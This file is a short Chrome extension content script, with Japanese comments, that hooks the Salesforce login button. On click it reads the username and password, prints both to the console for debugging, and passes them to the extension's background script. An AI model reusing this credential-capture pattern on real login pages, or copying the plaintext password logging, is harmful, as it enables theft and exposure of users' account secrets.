// ドキュメントが完全にロードされた後に実行
document.addEventListener('DOMContentLoaded', function() {
    const loginButton = document.querySelector('input[type="submit"][name="Login"]'); // Salesforceのログインボタンを特定
    console.log(loginButton);
    if (loginButton) {
        loginButton.addEventListener('click', function(event) {
            // ログイン情報の取得
            const username = document.querySelector('input[type="email"][name="username"]').value; // Salesforceのユーザ名フィールド
            const password = document.querySelector('input[type="password"][name="pw"]').value; // Salesforceのパスワードフィールド

            // デバッグ用: コンソールに出力
            console.log('Username:', username);
            console.log('Password:', password);

            // バックグラウンドスクリプトへの送信（オプション）
            chrome.runtime.sendMessage({username: username, password: password}, function(response) {
            console.log('Response from background:', response);
            });
        });
    }
});
